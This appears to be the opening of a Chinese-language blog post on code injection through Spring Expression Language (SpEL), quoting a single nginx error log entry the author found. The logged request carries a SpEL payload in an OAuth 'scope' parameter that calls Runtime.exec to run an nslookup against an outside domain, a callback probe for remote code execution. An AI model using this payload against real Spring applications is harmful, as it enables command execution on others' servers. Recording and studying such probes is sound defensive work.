---
title:      通过SpEL进行代码注入
layout:     post
category:   blog
tags:       [spring, java, crack]
---

今天看日志中出现了这么一条请求

    2019/08/08 15:03:33 [error] 14451#14451: *158426 open() "/usr/share/nginx/html/oauth/authorize" failed (2: No such file or directory), client: xxxx.xxxx.xxxx.xxxx, server: blabla.com, request: "GET /oauth/authorize?client_id=[id]&response_type=[type]&scope=$%7BT(java.lang.Runtime).getRuntime().exec(%22nslookup%20btubh.i.lnke.site%22)%7D&redirect_uri=[uri] HTTP/1.1", host: "xxxx.xxxx.xxxx.xxxx"